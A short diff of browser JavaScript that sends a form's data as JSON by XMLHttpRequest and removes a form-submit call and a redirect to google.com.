@@ -21,7 +21,5 @@ xhr.setRequestHeader("Access-Control-Allow-Origin","*");
 var data = JSON.stringify(form);
 console.log(data);
 xhr.send(data);
-forms.submit();
-location.href = "http://google.com";
 // return false;
 }
